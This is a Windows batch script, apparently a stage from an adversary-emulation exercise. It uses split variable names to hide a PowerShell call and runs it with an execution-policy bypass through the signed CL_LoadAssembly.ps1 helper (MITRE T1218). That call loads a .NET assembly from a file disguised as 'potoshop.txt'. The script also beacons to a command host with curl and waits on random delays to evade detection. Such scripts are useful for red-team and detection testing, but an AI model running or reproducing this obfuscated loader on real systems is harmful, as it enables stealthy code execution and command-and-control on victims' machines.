@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_ placeholder assignments
SET txisnba=%APPDATA%\8617\031f4564
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8617-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=potoshop.txt
SET dvhhyc=8617

REM Setup log file path
SET jlkwdx=%APPDATA%\!rrocubc!\macula-simulations.log
SET pzmfqx=!jlkwdx!

REM Random variable names for obfuscation
SET qlndhp=CL_
SET wkfdpn=LoadA
SET tmyfbb=ssembly
SET vrbxap=.ps1
SET xzmvbx=!qlndhp!!wkfdpn!!tmyfbb!!vrbxap!

SET nvpwks=powers
SET lyzqbj=hell.e
SET hgzqwr=!nvpwks!!lyzqbj!
SET fqjbms=-ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\
SET gvnqkp=; LoadAssemblyFromPath 
SET qtzlkr=;[Program]::Dale()"
SET pqzxnf=!fqjbms!!xzmvbx!!gvnqkp!!txisnba!\!xzanpex!!qtzlkr!

REM Initial delay
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_start=30>> "!pzmfqx!" 2>nul
timeout /t 30 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_complete>> "!pzmfqx!" 2>nul

REM C2 heartbeat (mandatory, not obfuscated)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_start>> "!pzmfqx!" 2>nul
curl -k -s -o nul "!keghkgto!"
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_complete>> "!pzmfqx!" 2>nul

REM Random delay
SET /A mjxqop=%RANDOM% %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_start=!mjxqop!>> "!pzmfqx!" 2>nul
timeout /t !mjxqop! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_complete>> "!pzmfqx!" 2>nul

REM Execute .NET assembly via obfuscated command
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: executing_assembly_start>> "!pzmfqx!" 2>nul
SET bnpdrs=!hgzqwr!
CALL SET execmd=!pqzxnf!
SET ttp_result=1
SET ttp_err=
!bnpdrs! !execmd!

IF NOT !ERRORLEVEL! EQU 0 (
    SET ttp_result=0
    SET ttp_err=execution_failed_!ERRORLEVEL!
)

REM TTP logging
SET nbgtds=!DATE:/=-!
SET nbgtds=!nbgtds:~4!
SET tpqbfd=!TIME:~0,12!
SET tpqbfd=!tpqbfd: =0!
echo [!nbgtds! !tpqbfd!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|SignedBinaryProxyExecution=!ttp_result!:!ttp_err!>> "!jlkwdx!" 2>nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: ttp_logged=!ttp_result!>> "!pzmfqx!" 2>nul

REM Final delay
ping -n 10 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: script_complete>> "!pzmfqx!" 2>nul